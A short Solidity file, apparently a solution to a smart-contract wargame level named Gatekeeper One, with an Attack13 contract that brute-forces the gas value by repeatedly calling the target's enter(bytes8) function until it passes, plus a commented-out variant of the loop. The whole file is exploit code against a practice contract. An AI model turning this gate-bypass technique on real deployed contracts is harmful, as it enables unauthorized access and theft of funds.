// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./13-gatekeeper-1.sol";

contract Attack13 {
    bytes8 public gateKey;
    uint public gasAmount;
    GatekeeperOne public target;

    constructor(address _targetAddress) {
        target = GatekeeperOne(_targetAddress);
    }

    function attack(bytes8 _gateKey) external {
        for (uint256 i = 0; i < 24000; i++) {
            (bool result, ) = address(target).call{gas: 8191 + i}(
                abi.encodeWithSignature(("enter(bytes8)"), _gateKey)
            );

            if (result) {
                break;
            }
        }
    }
}

/*
        for (uint256 i = 0; i < 8191; i++) {
            
            (bool result, ) = target.call{gas: 24000 + i}(abi.encodeWithSignature(("enter(bytes8)"), _gateKey));
            
            if (result) {
                break;
            }
        }
*/
